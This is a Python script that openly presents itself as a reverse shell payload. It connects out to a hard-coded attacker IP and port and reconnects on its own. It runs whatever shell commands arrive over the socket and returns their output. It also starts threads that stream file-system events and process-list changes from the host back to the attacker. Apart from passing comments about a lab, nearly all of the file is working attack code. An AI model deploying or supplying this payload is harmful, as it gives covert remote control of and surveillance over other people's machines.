#!/usr/bin/env python3
"""
payload_monitor.py
Reverse shell that also spawns monitoring threads:
 - File events via inotifywait (requires inotify-tools)
 - Process-list diffs using psutil
Sends monitoring alerts to attacker as structured messages prefixed with ALERT||<json>
"""

import socket
import subprocess
import threading
import time
import json
import psutil
import os
import sys

ATTACKER_IP = "10.40.9.85"   # <- change to your attacker IP
ATTACKER_PORT = 4444

MONITOR_PATH = "/tmp/monitor.py"       # path to watch with inotifywait (change to your test dir)
PROC_POLL_INTERVAL = 5      # seconds

RECONNECT_DELAY = 5

def send_safe(sock, data: bytes):
    try:
        sock.sendall(data)
    except Exception:
        # socket problems - let the main loop handle reconnection
        raise

def monitor_inotify(sock):
    """Run inotifywait -m and forward events as ALERT||JSON"""
    # ensure inotifywait is installed; we assume it is for this script
    cmd = ["inotifywait", "-m", "-e", "create,modify,delete,move", MONITOR_PATH, "--format", "%T|%w|%e|%f", "--timefmt", "%F %T"]
    try:
        p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
    except FileNotFoundError:
        # inotifywait missing
        msg = {"monitor": "inotify", "error": "inotifywait not found"}
        send_safe(sock, (f"ALERT||{json.dumps(msg)}\n").encode())
        return

    for line in p.stdout:
        line = line.strip()
        if not line:
            continue
        # build alert
        timestamp, path, evts, filename = line.split("|", 3)
        alert = {
            "monitor": "inotify",
            "timestamp": timestamp,
            "path": path,
            "event": evts,
            "file": filename
        }
        try:
            send_safe(sock, (f"ALERT||{json.dumps(alert)}\n").encode())
        except Exception:
            break
    try:
        p.terminate()
    except Exception:
        pass

def monitor_processes(sock):
    """Send diffs of processes every PROC_POLL_INTERVAL seconds"""
    prev = {p.pid: (p.name(), p.username()) for p in psutil.process_iter(['name','username'])}
    while True:
        try:
            time.sleep(PROC_POLL_INTERVAL)
            curr = {}
            for p in psutil.process_iter(['name','username']):
                try:
                    curr[p.pid] = (p.info['name'], p.info['username'])
                except Exception:
                    continue
            added = []
            removed = []
            for pid, info in curr.items():
                if pid not in prev:
                    added.append({"pid": pid, "name": info[0], "user": info[1]})
            for pid, info in prev.items():
                if pid not in curr:
                    removed.append({"pid": pid, "name": info[0], "user": info[1]})
            if added or removed:
                alert = {
                    "monitor": "process",
                    "timestamp": time.strftime("%F %T"),
                    "added": added,
                    "removed": removed
                }
                try:
                    send_safe(sock, (f"ALERT||{json.dumps(alert)}\n").encode())
                except Exception:
                    break
            prev = curr
        except Exception:
            # keep running, but report error once
            try:
                err = {"monitor": "process", "error": "monitor thread crashed"}
                send_safe(sock, (f"ALERT||{json.dumps(err)}\n").encode())
            except Exception:
                pass
            break

def interactive_shell(conn):
    """Simple interactive shell loop: receive command, execute, send back output"""
    try:
        while True:
            data = conn.recv(4096)
            if not data:
                break
            cmd = data.decode().strip()
            if cmd == "":
                continue
            if cmd.lower() in ("exit","quit"):
                break
            try:
                # run the command
                proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                out, err = proc.communicate(timeout=30)
            except subprocess.TimeoutExpired:
                proc.kill()
                out, err = "", "command timed out"
            except Exception as e:
                out, err = "", str(e)
            # structure output so listener can distinguish normal output from alerts
            payload = {"type": "cmd_result", "cmd": cmd, "stdout": out, "stderr": err}
            try:
                conn.sendall((json.dumps(payload) + "\n").encode())
            except Exception:
                break
    except Exception:
        pass

def main_loop():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(15)
            s.connect((ATTACKER_IP, ATTACKER_PORT))
            s.settimeout(None)
            # Start monitors as daemon threads (they use the same socket)
            t1 = threading.Thread(target=monitor_inotify, args=(s,), daemon=True)
            t2 = threading.Thread(target=monitor_processes, args=(s,), daemon=True)
            t1.start()
            t2.start()

            # Start interactive shell loop - this blocks until connection closes
            interactive_shell(s)
        except Exception:
            # On any exception, close socket and retry after a delay
            try:
                s.close()
            except Exception:
                pass
            time.sleep(RECONNECT_DELAY)
            continue
        finally:
            try:
                s.close()
            except Exception:
                pass
        # connection closed cleanly, attempt reconnect
        time.sleep(RECONNECT_DELAY)

if __name__ == "__main__":
    # Minimal safety check
    if os.geteuid() == 0:
        # optional: run as non-root in lab
        pass
    main_loop()
